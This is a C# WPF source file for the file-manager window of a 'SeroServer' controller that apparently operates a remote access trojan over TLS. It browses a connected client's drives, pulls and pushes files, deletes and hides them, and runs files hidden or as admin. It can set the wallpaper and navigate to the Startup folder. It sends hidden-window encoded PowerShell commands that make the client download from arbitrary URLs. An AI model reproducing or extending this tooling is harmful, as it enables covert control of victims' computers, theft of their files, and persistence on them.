using System.Collections.ObjectModel;
using System.IO;
using System.Windows;
using System.Windows.Input;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class FileManagerWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<FileEntryVM> _entries = [];
    private readonly Stack<string> _history = new();
    private string _currentPath = "";

    // Pending async results
    private TaskCompletionSource<string>? _pendingList;
    private TaskCompletionSource<string>? _pendingData;
    private TaskCompletionSource<string>? _pendingHash;
    private TaskCompletionSource<string>? _pendingAck;

    public FileManagerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;
        GridFiles.ItemsSource = _entries;

        _server.RegisterHandler(clientId, PacketType.FmListResult, pkt => { _pendingList?.TrySetResult(pkt.Data); });
        _server.RegisterHandler(clientId, PacketType.FmFileData,   pkt => { _pendingData?.TrySetResult(pkt.Data); });
        _server.RegisterHandler(clientId, PacketType.FmHashResult,  pkt => { _pendingHash?.TrySetResult(pkt.Data); });
        _server.RegisterHandler(clientId, PacketType.FmAck,         pkt => { _pendingAck?.TrySetResult(pkt.Data); });

        // WMF pipeline teardown (Source = null) can block the UI thread for ~1s.
        // Fix: hide the window immediately so the user sees an instant close, then do
        // the slow WMF cleanup in a Background-priority dispatch before the real Close().
        bool _wmfCleanupDone = false;
        Closing += (s, e) =>
        {
            if (_wmfCleanupDone) return;
            e.Cancel = true;
            _wmfCleanupDone = true;
            Hide();
            var tmp = _previewTempFile;
            _previewTempFile = null;
            Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, () =>
            {
                PreviewVideo.Stop();
                PreviewVideo.Source = null;
                if (tmp != null) try { System.IO.File.Delete(tmp); } catch { }
                Close();
            });
        };
        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.FmListResult);
            _server.UnregisterHandler(clientId, PacketType.FmFileData);
            _server.UnregisterHandler(clientId, PacketType.FmHashResult);
            _server.UnregisterHandler(clientId, PacketType.FmAck);
        };
        // MediaOpened fires when WMF has fully opened the file — safe moment to call Play()
        PreviewVideo.MediaOpened += (_, _) => PreviewVideo.Play();

        Loaded += async (_, _) =>
        {
            await Task.Delay(Random.Shared.Next(0, 250));
            await Navigate("");  // root = drives on Windows; populates DrivesList too
        };
    }

    // ── Drives ────────────────────────────────────────

    // Drives are populated from Navigate("") — stub returns drive list for empty path.
    // Called by Navigate() after populating _entries.
    private void UpdateDrivesFromEntries(IEnumerable<FileEntryVM> entries)
    {
        var drives = entries
            .Where(e => e.IsDir && e.Name.Length >= 2 && e.Name[1] == ':')
            .Select(e => e.Name.TrimEnd('\\', '/') + "\\")
            .ToList();
        if (drives.Count > 0)
        {
            DrivesList.Items.Clear();
            foreach (var d in drives) DrivesList.Items.Add(new DriveItemVM(d));
        }
    }

    // ── Transfer strip ────────────────────────────────

    private void ShowTransfer(string name, string status)
        => _ = Dispatcher.BeginInvoke(() =>
        {
            TxtTransferName.Text   = name.Length > 30 ? name[..30] + "…" : name;
            TxtTransferStatus.Text = status;
            TransferStrip.Visibility = Visibility.Visible;
        });

    private void HideTransfer()
        => _ = Dispatcher.BeginInvoke(() => TransferStrip.Visibility = Visibility.Collapsed);

    // ── Navigation ────────────────────────────────────

    private async Task Navigate(string path)
    {
        TxtStatus.Text = "Loading…";
        try
        {
            _pendingList = new TaskCompletionSource<string>();
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmList,
                Data = JsonConvert.SerializeObject(new FmListData { Path = path })
            });

            var json = await _pendingList.Task.WaitAsync(TimeSpan.FromSeconds(15));
            var result = JsonConvert.DeserializeObject<FmListResultData>(json);
            if (result == null) { TxtStatus.Text = "No response."; return; }
            if (!string.IsNullOrEmpty(result.Error)) { TxtStatus.Text = $"Error: {result.Error}"; return; }

            if (!string.IsNullOrEmpty(_currentPath))
                _history.Push(_currentPath);

            _currentPath = result.Path;
            TxtPath.Text = _currentPath;
            _entries.Clear();
            foreach (var e in result.Entries.OrderByDescending(x => x.IsDir).ThenBy(x => x.Name))
                _entries.Add(new FileEntryVM(e));

            // If root navigation, populate drives from the result
            if (string.IsNullOrEmpty(path) || path == "\\")
                UpdateDrivesFromEntries(_entries);

            var dirs  = result.Entries.Count(x => x.IsDir);
            var files = result.Entries.Count - dirs;
            TxtStatus.Text = $"{result.Path}  —  {files} file(s), {dirs} folder(s)";
            if (TxtFileCount != null)
                TxtFileCount.Text = $"{files} files — {dirs} directories";
        }
        catch (TimeoutException) { TxtStatus.Text = "Timeout."; }
        catch (Exception ex)    { TxtStatus.Text = ex.Message; }
        finally { _pendingList = null; }
    }

    // ── Context menu actions ──────────────────────────

    private async void Download_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var dlg = new Microsoft.Win32.SaveFileDialog { FileName = row.Name };
        if (dlg.ShowDialog() != true) return;

        TxtStatus.Text = $"Downloading {row.Name}…";
        ShowTransfer(row.Name, "Downloading…");
        try
        {
            _pendingData = new TaskCompletionSource<string>();
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmDownload,
                Data = JsonConvert.SerializeObject(new FmDownloadData { Path = _currentPath.TrimEnd('\\', '/') + "\\" + row.Name })
            });
            var json = await _pendingData.Task.WaitAsync(TimeSpan.FromSeconds(60));
            var result = JsonConvert.DeserializeObject<FmFileDataResult>(json);
            if (result == null || !string.IsNullOrEmpty(result.Error)) { TxtStatus.Text = $"Error: {result?.Error}"; return; }
            var bytes = Convert.FromBase64String(result.Data);
            await File.WriteAllBytesAsync(dlg.FileName, bytes);
            NotificationService.NotifyDownloadComplete();
            TxtStatus.Text = $"Downloaded: {row.Name}  ({bytes.Length:N0} bytes)";
        }
        catch (Exception ex) { TxtStatus.Text = ex.Message; }
        finally { _pendingData = null; HideTransfer(); }
    }

    private async void Upload_Click(object s, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog { Multiselect = false };
        if (dlg.ShowDialog() != true) return;
        var destPath = Path.Combine(_currentPath, Path.GetFileName(dlg.FileName));
        var uploadName = Path.GetFileName(dlg.FileName);
        TxtStatus.Text = $"Uploading {uploadName}…";
        ShowTransfer(uploadName, "Uploading…");
        try
        {
            var bytes = await File.ReadAllBytesAsync(dlg.FileName);
            _pendingAck = new TaskCompletionSource<string>();
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmUpload,
                Data = JsonConvert.SerializeObject(new FmUploadData { Path = destPath, Data = Convert.ToBase64String(bytes) })
            });
            await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(30));
            NotificationService.NotifyUploadComplete();
            TxtStatus.Text = $"Uploaded: {Path.GetFileName(dlg.FileName)}";
            await Navigate(_currentPath);
        }
        catch (Exception ex) { TxtStatus.Text = ex.Message; }
        finally { _pendingAck = null; HideTransfer(); }
    }

    private async void Delete_Click(object s, RoutedEventArgs e)
    {
        var selected = GridFiles.SelectedItems.Cast<FileEntryVM>().ToList();
        if (selected.Count == 0) return;
        var msg = selected.Count == 1 ? $"Delete '{selected[0].Name}'?" : $"Delete {selected.Count} items?";
        if (MessageBox.Show(msg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        foreach (var row in selected)
        {
            var path = Path.Combine(_currentPath, row.Name);
            _pendingAck = new TaskCompletionSource<string>();
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmDelete, Data = JsonConvert.SerializeObject(new FmDeleteData { Path = path }) });
            try { await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(10)); NotificationService.NotifyFileDeleted(); } catch { }
            finally { _pendingAck = null; }
        }
        await Navigate(_currentPath);
    }

    private async void Rename_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var newName = PromptInput($"Rename '{row.Name}' to:", row.Name);
        if (string.IsNullOrWhiteSpace(newName) || newName == row.Name) return;
        var oldPath = Path.Combine(_currentPath, row.Name);
        var newPath = Path.Combine(_currentPath, newName);
        _pendingAck = new TaskCompletionSource<string>();
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmRename, Data = JsonConvert.SerializeObject(new FmRenameData { OldPath = oldPath, NewPath = newPath }) });
        try { await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(15)); } catch { }
        finally { _pendingAck = null; }
        await Navigate(_currentPath);
    }

    private async void NewFolder_Click(object s, RoutedEventArgs e)
    {
        var name = PromptInput("New folder name:", "New Folder");
        if (string.IsNullOrWhiteSpace(name)) return;
        var path = Path.Combine(_currentPath, name);
        _pendingAck = new TaskCompletionSource<string>();
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmMkDir, Data = JsonConvert.SerializeObject(new FmMkDirData { Path = path }) });
        try { await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(15)); } catch { }
        finally { _pendingAck = null; }
        await Navigate(_currentPath);
    }

    private async void Exec_Normal_Click(object s, RoutedEventArgs e) => await ExecFile("normal");
    private async void Exec_Hidden_Click(object s, RoutedEventArgs e) => await ExecFile("hidden");
    private async void Exec_Admin_Click(object s, RoutedEventArgs e)  => await ExecFile("runas");

    private async Task ExecFile(string mode)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var path = Path.Combine(_currentPath, row.Name);
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.FmExec,
            Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = mode })
        });
        TxtStatus.Text = $"Executed: {row.Name} ({mode})";
    }

    private async void Hash_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var path = Path.Combine(_currentPath, row.Name);
        TxtStatus.Text = "Computing hash…";
        _pendingHash = new TaskCompletionSource<string>();
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmHash, Data = JsonConvert.SerializeObject(new FmHashData { Path = path }) });
        try
        {
            var json = await _pendingHash.Task.WaitAsync(TimeSpan.FromSeconds(30));
            var r = JsonConvert.DeserializeObject<FmHashResultData>(json);
            if (r != null && string.IsNullOrEmpty(r.Error))
            {
                Clipboard.SetText(r.Hash);
                MessageBox.Show($"SHA-256: {r.Hash}\n\n(copied to clipboard)", row.Name, MessageBoxButton.OK, MessageBoxImage.Information);
                TxtStatus.Text = $"Hash: {r.Hash[..16]}…";
            }
            else TxtStatus.Text = $"Hash error: {r?.Error}";
        }
        catch { TxtStatus.Text = "Hash timeout."; }
        finally { _pendingHash = null; }
    }

    private async void ShowHide_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var path = Path.Combine(_currentPath, row.Name);
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.FmShowHide,
            Data = JsonConvert.SerializeObject(new FmShowHideData { Path = path, Hide = !row.IsHidden })
        });
        await Navigate(_currentPath);
    }

    private async void Wallpaper_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var path = Path.Combine(_currentPath, row.Name);
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.FunCmd,
            Data = JsonConvert.SerializeObject(new FunCmdData { Action = "set_wallpaper", Param = path })
        });
        TxtStatus.Text = $"Wallpaper set: {row.Name}";
    }

    private async void PlayMusic_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
        var path = Path.Combine(_currentPath, row.Name);
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.FmExec,
            Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = "normal" })
        });
        TxtStatus.Text = $"Playing: {row.Name}";
    }

    private async void Zip_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row) return;
        var path = Path.Combine(_currentPath, row.Name);
        var dest = path + ".zip";
        // Use PS encoded command — path passed via env var to avoid injection
        var ps  = "Compress-Archive -Path $env:SERO_SRC -DestinationPath $env:SERO_DST -Force";
        var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.AutoTaskShell,
            Data = $"SET SERO_SRC={path}&& SET SERO_DST={dest}&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
        });
        TxtStatus.Text = $"Zipping {row.Name}…";
        await Task.Delay(2000);
        await Navigate(_currentPath);
    }

    private async void DownloadUrl_Click(object s, RoutedEventArgs e)
    {
        var url = PromptInput("URL to download:", "https://");
        if (string.IsNullOrWhiteSpace(url)) return;

        // Validate URL before sending
        if (!Uri.TryCreate(url, UriKind.Absolute, out var parsedUri) ||
            (parsedUri.Scheme != "http" && parsedUri.Scheme != "https"))
        {
            TxtStatus.Text = "Invalid URL (must be http/https).";
            return;
        }

        var filename = Path.GetFileName(parsedUri.LocalPath);
        if (string.IsNullOrWhiteSpace(filename)) filename = "download";
        // Sanitize filename — strip any path separators
        filename = Path.GetFileName(filename);
        var dest = Path.Combine(_currentPath, filename);

        // Use PS encoded command — URL via env var to avoid injection
        var ps  = "Invoke-WebRequest -Uri $env:SERO_URL -OutFile $env:SERO_OUT -UseBasicParsing";
        var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.AutoTaskShell,
            Data = $"SET SERO_URL={url}&& SET SERO_OUT={dest}&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
        });
        TxtStatus.Text = $"Downloading {filename}…";
        await Task.Delay(3000);
        await Navigate(_currentPath);
    }

    // ── Navigation buttons ──────────────────────────

    private async void Back_Click(object s, RoutedEventArgs e)
    {
        if (_history.TryPop(out var prev))
        {
            var saved = _currentPath;
            _currentPath = "";
            await Navigate(prev);
            // Don't push prev back
            if (_history.Count > 0 && _history.Peek() == prev)
                _history.Pop();
        }
        else
        {
            var parent = Path.GetDirectoryName(_currentPath);
            await Navigate(parent ?? "");
        }
    }

    private async void Refresh_Click(object s, RoutedEventArgs e) => await Navigate(_currentPath);
    private async void GoPath_Click(object s, RoutedEventArgs e) => await Navigate(TxtPath.Text.Trim());
    private async void TxtPath_KeyDown(object s, KeyEventArgs e) { if (e.Key == Key.Return) await Navigate(TxtPath.Text.Trim()); }

    private async void GoToDesktop_Click(object s, RoutedEventArgs e) => await Navigate("%USERPROFILE%\\Desktop");
    private async void GoToUser_Click(object s, RoutedEventArgs e)    => await Navigate("%USERPROFILE%");
    private async void GoToTemp_Click(object s, RoutedEventArgs e)    => await Navigate("%TEMP%");
    private async void GoToAppData_Click(object s, RoutedEventArgs e) => await Navigate("%APPDATA%");
    private async void GoToStartup_Click(object s, RoutedEventArgs e) => await Navigate("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    private async void GoToWindows_Click(object s, RoutedEventArgs e)  => await Navigate("%SystemRoot%");
    private async void GoToSystem32_Click(object s, RoutedEventArgs e) => await Navigate("%SystemRoot%\\System32");

    private async void DrivesList_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
    {
        if (DrivesList.SelectedItem is DriveItemVM driveItem)
        {
            DrivesList.SelectedItem = null;
            await Navigate(driveItem.Path);
        }
    }

    private async void GridFiles_DoubleClick(object s, MouseButtonEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM row || !row.IsDir) return;
        var path = string.IsNullOrEmpty(_currentPath)
            ? row.Name
            : Path.Combine(_currentPath, row.Name);
        await Navigate(path);
    }

    // ── Helpers ─────────────────────────────────────

    private static string? PromptInput(string label, string defaultVal = "")
    {
        var dlg = new Window
        {
            Title = "Input", Width = 380, Height = 130,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 18, 34))
        };
        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(16) };
        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = label, Foreground = System.Windows.Media.Brushes.White,
            FontSize = 12, Margin = new Thickness(0, 0, 0, 8)
        });
        var tb = new System.Windows.Controls.TextBox
        {
            Text = defaultVal,
            Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24)),
            Foreground = System.Windows.Media.Brushes.White,
            BorderBrush = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(42, 48, 88)),
            Padding = new Thickness(6, 4, 6, 4),
            Margin = new Thickness(0, 0, 0, 8)
        };
        sp.Children.Add(tb);
        var ok = new System.Windows.Controls.Button
        {
            Content = "OK", Width = 60, HorizontalAlignment = HorizontalAlignment.Right,
            Padding = new Thickness(10, 4, 10, 4)
        };
        ok.Click += (_, _) => { dlg.DialogResult = true; };
        sp.Children.Add(ok);
        dlg.Content = sp;
        tb.SelectAll(); tb.Focus();
        return dlg.ShowDialog() == true ? tb.Text : null;
    }

    // ── Preview pane ─────────────────────────────────────────────────────────

    private string? _previewTempFile;

    private void GridFiles_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM vm || vm.IsDir)
        {
            TxtPreviewName.Text = GridFiles.SelectedItems.Count > 1
                ? $"{GridFiles.SelectedItems.Count} items selected"
                : "No file selected";
            BtnPreview.IsEnabled = false;
            return;
        }
        TxtPreviewName.Text = vm.Name;
        BtnPreview.IsEnabled = true;
        // Auto-preview for images, text, and small videos (< 150 MB)
        var ext = Path.GetExtension(vm.Name).ToLowerInvariant();
        bool isImage = ext is ".jpg" or ".jpeg" or ".png" or ".gif" or ".bmp" or ".webp" or ".ico";
        bool isText  = ext is ".txt" or ".log" or ".ini" or ".cfg" or ".json" or ".xml" or ".csv" or ".bat" or ".ps1" or ".py" or ".cs";
        bool isVideo = ext is ".mp4" or ".avi" or ".mkv" or ".mov" or ".wmv" or ".webm" or ".m4v";
        if (isImage || isText || (isVideo && vm.SizeRaw < 150L * 1024 * 1024))
            BtnPreview_Click(null!, new RoutedEventArgs());
    }

    private async void BtnPreview_Click(object s, RoutedEventArgs e)
    {
        if (GridFiles.SelectedItem is not FileEntryVM vm || vm.IsDir) return;
        var path = _currentPath.TrimEnd('\\', '/') + "\\" + vm.Name;
        var ext  = Path.GetExtension(vm.Name).ToLowerInvariant();

        TxtPreviewInfo.Text = "Loading…";
        ShowPreviewPanel("empty");
        BtnPreview.IsEnabled = false;

        try
        {
            _pendingData = new TaskCompletionSource<string>();
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.FmDownload,
                Data = JsonConvert.SerializeObject(new FmDownloadData { Path = path })
            });
            bool isVideoExt = ext is ".mp4" or ".avi" or ".mkv" or ".mov" or ".wmv" or ".webm" or ".m4v";
            var json   = await _pendingData.Task.WaitAsync(isVideoExt ? TimeSpan.FromSeconds(120) : TimeSpan.FromSeconds(30));
            var result = JsonConvert.DeserializeObject<FmFileDataResult>(json);
            if (result == null || !string.IsNullOrEmpty(result.Error))
            { TxtPreviewInfo.Text = result?.Error ?? "Error"; ShowPreviewPanel("empty"); return; }

            var bytes = Convert.FromBase64String(result.Data);

            bool isImage = ext is ".jpg" or ".jpeg" or ".png" or ".gif" or ".bmp" or ".webp" or ".ico";
            bool isVideo = ext is ".mp4" or ".avi" or ".mkv" or ".mov" or ".wmv" or ".webm" or ".m4v";
            bool isText  = ext is ".txt" or ".log" or ".ini" or ".cfg" or ".json" or ".xml"
                                or ".csv" or ".bat" or ".ps1" or ".py" or ".cs" or ".md" or ".html" or ".css";

            if (isImage)
            {
                using var ms = new System.IO.MemoryStream(bytes);
                var bmp = new System.Windows.Media.Imaging.BitmapImage();
                bmp.BeginInit();
                bmp.CacheOption = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
                bmp.StreamSource = ms;
                bmp.EndInit();
                bmp.Freeze();
                PreviewImage.Source = bmp;
                ShowPreviewPanel("image");
                TxtPreviewName.Text = $"{vm.Name}  ({bmp.PixelWidth}×{bmp.PixelHeight})";
            }
            else if (isVideo)
            {
                if (_previewTempFile != null) try { System.IO.File.Delete(_previewTempFile); } catch { }
                _previewTempFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "sero_prev_" + Path.GetFileName(vm.Name));
                await System.IO.File.WriteAllBytesAsync(_previewTempFile, bytes);
                // Make element visible BEFORE setting source so MediaElement can measure
                ShowPreviewPanel("video");
                PreviewVideo.Source = new Uri(System.IO.Path.GetFullPath(_previewTempFile), UriKind.Absolute);
                PreviewVideo.Volume = 0.8;
                // Play() is called by the MediaOpened event handler — not here
                TxtPreviewName.Text = vm.Name;
            }
            else if (isText)
            {
                var text = System.Text.Encoding.UTF8.GetString(bytes);
                if (text.Length > 200_000) text = text[..200_000] + "\n[truncated]";
                PreviewText.Text = text;
                ShowPreviewPanel("text");
            }
            else
            {
                TxtPreviewInfo.Text = $"{vm.Name}\n{vm.SizeDisplay}\n{vm.Modified}";
                ShowPreviewPanel("empty");
            }
        }
        catch (Exception ex) { TxtPreviewInfo.Text = ex.Message; ShowPreviewPanel("empty"); }
        finally { _pendingData = null; BtnPreview.IsEnabled = true; }
    }

    private void ShowPreviewPanel(string which)
    {
        PreviewImage.Visibility = which == "image" ? Visibility.Visible : Visibility.Collapsed;
        PreviewVideo.Visibility = which == "video" ? Visibility.Visible : Visibility.Collapsed;
        TextScroll.Visibility   = which == "text"  ? Visibility.Visible : Visibility.Collapsed;
        PreviewEmpty.Visibility = which == "empty" ? Visibility.Visible : Visibility.Collapsed;
        if (which != "video") { try { PreviewVideo.Stop(); PreviewVideo.Source = null; } catch { } }
    }

    private void PreviewVideo_Click(object s, System.Windows.Input.MouseButtonEventArgs e)
    {
        try
        {
            if (PreviewVideo.CanPause) PreviewVideo.Pause();
            else PreviewVideo.Play();
        }
        catch { }
    }

    private bool _maximized;
    private void BtnMax_Click(object s, RoutedEventArgs e)
    {
        _maximized = !_maximized;
        WindowState = _maximized ? WindowState.Maximized : WindowState.Normal;
        RootBorder.CornerRadius = _maximized ? new CornerRadius(0) : new CornerRadius(8);
        BtnMax.Content = _maximized ? "❐" : "☐";
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized)
            DragMove();
    }


    private void ResizeGrip_DragDelta(object s, System.Windows.Controls.Primitives.DragDeltaEventArgs e)
    {
        Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
        Height = Math.Max(MinHeight, Height + e.VerticalChange);
    }

    private void Close_Click(object s, RoutedEventArgs e)
    {
        if (_previewTempFile != null)
            try { System.IO.File.Delete(_previewTempFile); } catch { }
        Close();
    }
}

public class FileEntryVM
{
    public System.Windows.Media.ImageSource? IconImage   { get; }
    public string Name        { get; }
    public bool   IsDir       { get; }
    public bool   IsHidden    { get; }
    public long   SizeRaw     { get; }
    public string SizeDisplay { get; }
    public string Modified    { get; }
    public string TypeDisplay { get; }

    public FileEntryVM(FmEntry e)
    {
        Name     = e.Name;
        IsDir    = e.IsDir;
        IsHidden = e.IsHidden;
        Modified = e.Modified;
        SizeRaw  = e.IsDir ? -1 : e.Size;
        IconImage = (e.IsDir && e.Name.Length >= 2 && e.Name[1] == ':')
            ? ShellIcon.GetDrive(e.Name.TrimEnd('\\', '/') + "\\")
            : ShellIcon.Get(e.IsDir ? "" : Path.GetExtension(e.Name), e.IsDir);

        if (e.IsDir)
        {
            SizeDisplay = "";
            TypeDisplay = "Folder";
        }
        else
        {
            var ext = Path.GetExtension(e.Name);
            TypeDisplay = string.IsNullOrEmpty(ext) ? "File" : ext.TrimStart('.').ToUpperInvariant();
            var bytes = e.Size;
            SizeDisplay = bytes < 1024           ? $"{bytes} B"
                        : bytes < 1024 * 1024    ? $"{bytes / 1024.0:F1} KB"
                        : bytes < 1024L*1024*1024 ? $"{bytes / (1024.0*1024):F1} MB"
                        : $"{bytes / (1024.0*1024*1024):F1} GB";
        }
    }
}

public class DriveItemVM
{
    public string Path { get; }
    public System.Windows.Media.ImageSource? Icon { get; }
    public DriveItemVM(string path) { Path = path; Icon = ShellIcon.GetDrive(path); }
}
